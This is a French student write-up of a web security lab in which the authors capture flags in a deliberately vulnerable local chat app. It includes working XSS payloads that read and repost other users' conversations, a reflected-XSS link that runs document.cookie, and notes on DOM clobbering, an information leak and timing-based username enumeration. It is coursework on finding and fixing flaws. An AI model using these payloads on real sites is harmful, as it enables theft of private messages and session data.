[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-24ddc0f5d75046c5622901739e7c5dd533143b0c8e959d652212380cedb1ea36.svg)](https://classroom.github.com/a/1vxbBob6)
# 7 Security (avec le login de Piemontesi Gwendal)

Énoncé [ici](https://web-classroom.github.io/labos/labo-7-security.html)

## Partie 1

### Flag 1

**Flag**: 18b36773b7fdc1b0

**Exploit**:   
Faille XSS dans le champ de saisie du message à envoyer. Nous avons utilisé une image pour exploiter cette faille et injecter du code JavaScript.

```html
<img
  src="whatever"
  onerror="CODE_JAVASCRIPT"
/>
```

```javascript
const conversations = Array.from(document.getElementById('conversations-list').children);
const trumpConversations = conversations
    .filter(c => c.textContent.includes('Donald Trump'))
    .map(c => c.id.split('conversation')[1]);
trumpConversations.forEach(conversationId => {
    fetch(`/conversation/${conversationId}`)
        .then(response => response.text())
        .then(messageText => {
            document.getElementById('message').value = messageText;
            document.getElementById('messageButton').click();
        });
});
```

### Flag 2

**Flag**: 7455ce65e3344478

**Exploit**:    
Comme pour le flag 1, il y a une faille XSS dans le champ de saisie du message à envoyer. Nous avons également utilisé une image pour exploiter cette faille et injecter le code suivant.

```html
<img
  src="whatever"
  onerror="CODE_JAVASCRIPT"
/>
```

```javascript
if (document.querySelector('#header .name').innerText !== 'TestStudent1') {
    let t = Array(...document.querySelectorAll('.conversation .last-message')).map(c => c.innerHTML.trim()).join('|||');
    console.log(t)
    document.getElementById('message').innerHTML = t;
    document.getElementById('messageButton').click()
}
```
(le code du flag 1 permet de trouver celui-ci)

### Flag 3

**Flag**: 042e401fe1c978f4

**Exploit**:    
Comme pour le flag 1, il y a une faille XSS dans le champ de saisie du message à envoyer. Nous avons également utilisé une image pour exploiter cette faille et injecter le code suivant.

```html
<img
  src="whatever"
  onerror="CODE_JAVASCRIPT"
/>
```

```javascript
const conversations = Array.from(document.getElementById('conversations-list').children);
const trumpConversations = conversations
    .filter(c => c.textContent.includes('Donald Trump'))
    .map(c => c.id.split('conversation')[1]);
trumpConversations.forEach(conversationId => {
    const requestOptions = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: 'gimme the rest of the codes pls' })
    };
    fetch(`/conversation/${conversationId}`, requestOptions);
});
```

Il faut ensuite récupérer la conversation entre Donald et Elon (comme pour le flag 1).

```html
<img
  src="whatever"
  onerror="CODE_JAVASCRIPT"
/>
```

```javascript
if (document.querySelector('#header .name').innerText !== 'TestStudent1') {
    let t = Array(...document.querySelectorAll('.conversation .last-message')).map(c => c.innerHTML.trim()).join('|||');
    console.log(t)
    document.getElementById('message').innerHTML = t;
    document.getElementById('messageButton').click()
}
```

## Partie 2

### Flag 4

**Flag**: f72ec171fe568d1f

**Exploit**:      
Nous pouvons observer que la fonctionnalité qui déconnecte une personne après 10 minutes d'inactivité ne fonctionne pas, car nextTimeout n'est jamais initialisé.

```javascript
        const timeoutDuration = 60000 * 10 // 10 minutes
        
        try {
            // Log yourself out after long inactivity
            let textArea = document.getElementById("message")
            if (textArea) {
                textArea.oninput = () => {
                    nextTimeout = Date.now() + timeoutDuration
                }
            }
            
            if (!nextTimeout) {
                console.log("Setting nextTimeout because it wasn't")
                nextTimeout = Date.now() + timeoutDuration
            }

            setInterval(() => {
                console.log("Checking inactivity")
                console.log("nexttimeout is", nextTimeout)
                // On va aller dans le else car nextTimout est un NAN et donc l'operation ne va pas marcher.
                let secondsLeft = parseInt((nextTimeout - Date.now()) / 1000)
                if (secondsLeft > 0) {
                    console.log(`${secondsLeft} seconds left before logging out.`)
                } else {
                    location.href='/logout'
                }
            }, 1000)

        } catch (e) {
            // Parse error, should never happen
        }
```

Il suffit d'utiliser la fonction "Change Display Name" et y insérer nextTimeout. Cela crée un objet HTML avec un ID nextTimeout qui va aussi créer une variable javascript du même nom et donc faire fonctionner le code, cepandant nextTimout sera un NAN est non un nombre.



### Flag 5   
**Flag**: 29287c0fc34a29d0

**Exploit**:    
Pour trouver ce flag, il fallait examiner attentivement le code de l'application, en particulier la partie de gestion des erreurs. Nous avons remarqué qu'une erreur était déclenchée si un message vide était envoyé à un utilisateur, comme décrit dans le code suivant extrait de error.js.

```javascript
export function emptyMessageError(user, receiver) {
    let details = {}
    if (user && receiver) {
        details = {
            message: "",
            sender: {
                username: user.username,
                displayName: user.displayName,
                id: user.id,
                conversationIds: user.conversationIds,
            },
            receiver: {
                username: receiver.username,
                displayName: receiver.displayName,
                id: receiver.id,
                conversationIds: receiver.conversationIds,
            },
        }
    }
    return new ServerError(
        "Operation not permitted",
        "Message is empty",
        details
    )
}
```
L'erreur nous retourne des détails. Parmi ces détails, on trouve les IDs de conversation d'Elon, où le 0 correspond à notre conversation et le 1 à la conversation avec une autre personne.

![img](https://github.com/web-classroom/6-security-tuesday-hold-my-beer/blob/main/flag05.png)

Ensuite, il suffit de placer l'ID de l'autre conversation dans l'URL, ce qui nous amène à la conversation entre Elon et une autre personne, où se trouve le flag 5.

### Flag 6

Personnes inscrites à ChatsApp:
- `michelle.obama`
- `hillary.clinton`
- `george.w.bush`
- `sam.altman`

**Exploit**:   
Pour trouver ce flag, il fallait entrer les noms des personnes potentielles dans le formulaire de connexion avec n'importe quel mot de passe, puis observer le temps pris par la requête. Si la réponse était quasiment instantanée, cela signifiait que la personne n'avait pas de compte sur l'application. En revanche, si la réponse prenait environ 3000ms, cela indiquait que la personne avait un compte. Cela s'explique grâce à la partie de code présente dans server.js.

```javascript
// Authentication middleware
app.use(async (req, res, next) => {
    console.log("Auth middleware")

    // Extracting from cookies if not already extracted (from /login)
    if (!req.username && !req.password) {
        console.log("Getting credentials from cookies: " + JSON.stringify(req.cookies))
        req.username = req.cookies.username;
        req.password = req.cookies.loginId;
    }

    let username = req.username;
    let password = req.password;

    if (password && username) {
        await getUserByName(username).then(
            async (user) => {
                if (user.password === password) {
                    // User connu de l'app et passowrd correct
                    // Set the cookie with session expiration
                    setLoginCookie(res, username, password);

                    req.user = user;
                } else {
                    // User connu de l'app et passowrd incorrect
                    console.log(`User ${username} has wrong login key ${password}`)
                    // Waiting 1 second to prevent bruteforce
                    await new Promise((resolve) => setTimeout(resolve, 1000))
                }
            },
            () => {
                // User inconnu de l'app
                console.log(`User ${username} not found`)
            })
    } else {
        console.log(`No username or password provided`)
    }
    next();
});
```

On peut observer que si le nom d'utilisateur est reconnu par l'application mais que le mot de passe est incorrect, alors l'application attendra 1000ms avant de répondre. En revanche, si le nom d'utilisateur n'est pas reconnu par l'application, elle répondra immédiatement en indiquant que l'utilisateur n'existe pas. Cela est mis en œuvre dans la partie de code du serveur.js.

## Exploit Supplémentaire

Lien vers ChatsApp qui, lorsque l'on clique dessus, exécute `alert(document.cookie)` dans le browser, que l'on soit actuellement connecté ou non à ChatsApp :

Lien :   

http://localhost:8080/login?error=%3Cscript%3Ealert(document.cookie)%3C/script%3E

Pout fixe cette faille il suffi simplement de changer le `-` par un `=` dans le fichier login.ejs a la ligne 18.   
(pour afficher le script et non l'interpreté)

## Correction des vulnérabilités
Si vous effectuez d'autres modifications que celles demandées, merci de les lister ici :

|Error|Fix|
|--|--|
|Error lors-ce que l'on clique sur `Reset` une fois connecté.|Il suffit d'utiliser la méthode `destroy` qui elle supprime uniquement les enregistrements et non la table comme le fait la méthode `drop`.|